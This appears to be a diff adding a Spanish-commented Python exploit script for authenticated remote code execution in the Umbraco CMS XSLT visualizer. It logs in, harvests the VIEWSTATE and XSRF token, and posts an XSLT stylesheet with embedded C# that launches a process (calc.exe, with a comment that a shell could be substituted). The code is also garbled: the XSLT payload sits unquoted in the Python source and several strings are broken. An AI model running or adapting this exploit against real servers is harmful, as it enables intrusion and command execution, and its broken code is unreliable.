@@ -1,0 +1,99 @@
+import requests; #Importa librería requests para hacer solicitudes HTTP
+
+from bs4 import BeautifulSoup; #Importar BeautifulSoup para poder extraer datos HTML y XML
+
+
+# Función print_dict, la cual imprime todos los ítems de dico. Dico pretende ser un diccionario
+def print_dict(dico):
+    print(dico.items());
+
+
+#Imprime un Start en pantalla
+print("Start");
+
+
+<?xml version="1.0"?> #Definición del documento xml
+<xsl:stylesheet version="1.0"
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+    xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
+
+  <msxsl:script language="C#" implements-prefix="csharp_user"> #Definición del script en C#
+    public string xml()
+    {
+        string cmd = ""; " #Cadena vacía llamada cmd
+
+        System.Diagnostics.Process proc = new System.Diagnostics.Process(); #Crea instancia de la clase process, proceso que aún no se ha iniciado. Se guarda den proc. Provee acceso a procesos remotos y locales.
+
+        proc.StartInfo.FileName = "calc.exe"; #Se especifica que el nombre del proceso a correr es la calculadora de Windows. Esto es para prueba de concepto, aquí puede ir cualquier ejecutable, como una Shell en poweshell o una cmd
+
+        proc.StartInfo.Arguments = cmd; #Se especifica que cmd guardará los argumentos que serán enviados a proc. Aquí se guardan los argumentos que serían enviados a una Shell.
+
+        proc.StartInfo.UseShellExecute = false; #El proceso se debe lanzar directamente sin pasar por la Shell del sistema, necesario para redirigir la salida.
+
+        proc.StartInfo.RedirectStandardOutput = true; #Se indica si el output de la aplicación es escrito en StandardOutput, se coloca a True
+
+        proc.Start(); #Se ejecuta calc.exe
+
+        string output = proc.StandardOutput.ReadToEnd(); #Toda la salida del proceso que se leyó se guarda output
+
+        return output;
+    }
+  </msxsl:script>
+
+  <xsl:template match="/">
+    <xsl:value-of select="csharp_user:xml()"/>
+  </xsl:template>
+
+</xsl:stylesheet>
+
+login = "XXXX; #Nombre del usuario autenticado
+password="XXXX"; #Contraseña
+host = "XXXX"; #Host
+
+# Step 1 - Get Main page
+s = requests.session() #Crea una sesión persistente
+url_main =host+"/umbraco/"; #URL del sitio
+r1 = s.get(url_main); #Get al sitio con la sesión s 
+print_dict(r1.cookies); #Se imprimen las cookies de la sesión. Son devueltas en forma de diccionario, por lo que se usa la función definida anteriormente para imprimir los elementos
+
+# Step 2 - Process Login
+url_login = host+"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"; #Página de Login
+loginfo = {"username":login,"password":password}; #Parámetros que se usarán para el login
+r2 = s.post(url_login,json=loginfo); #Postear el login con las credenciales con la sesión s
+
+# Step 3 - Go to vulnerable web page
+url_xslt = host+"/umbraco/developer/Xslt/xsltVisualize.aspx"; #Endpoint expuesto a RCE
+r3 = s.get(url_xslt); #Get al endpoint vulnerable usando la sesión s 
+
+#### SUSTITUIR AQUI
+
+soup = BeautifulSoup(r3.text, 'html.parser'); #Parsear el get en HTML 
+VIEWSTATE = soup.find(id="__VIEWSTATE")['value']; #Buscar el valor del elemento con el id "__VIEWSTATE"
+VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value']; #Busca también el valor de la variable y se guarda en VIEWSTATEGENERATOR
+
+UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN']; #Extrae la token UMB-XSRF-TOKEN de la sesión
+
+headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN}; #Se definen los headers que se usarán en la petición POST
+
+data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"}; #Se construye el diccionario para el exploit que se usará en el POST. 
+
+# Step 4 - Launch the attack
+r4 = s.post(url_xslt,data=data,headers=headers); #Se envía la petición 
+
+print("End"); #Imprimar End
+
+#### CODIGO PARA SUSTITUIR
+
+soup = BeautifulSoup(r3.text, 'html.parser'); #Se parsea la respuesta del sitio en forma de texto
+for line in r3.text.splitlines(): #Se recorre el texto linea por linea
+    if 'id="__VIEWSTATE"' in line: #Si la linea contiene la cadena indicada
+       VIEWSTATE = line.split('value="')[1].split('"')[0] #Se extrae el valor preciso indicando que el divisor a usar de la cadena es "valor"
+       print("El valor de VIEWSTATE es:") #Simplemente se imprime el valor para comprobar
+       print(VIEWSTATE)
+
+for line in r3.text.splitlines(): #Se hace lo mismo que el código de arriba pero con VIEWGENERATOR
+    if 'id="__VIEWSTATEGENERATOR"' in line:
+       VIEWSTATEGENERATOR = line.split('value="')[1].split('"')[0]
+       print("El valor de VIEWSTATEGENERATOR es:")
+       print(VIEWSTATEGENERATOR)
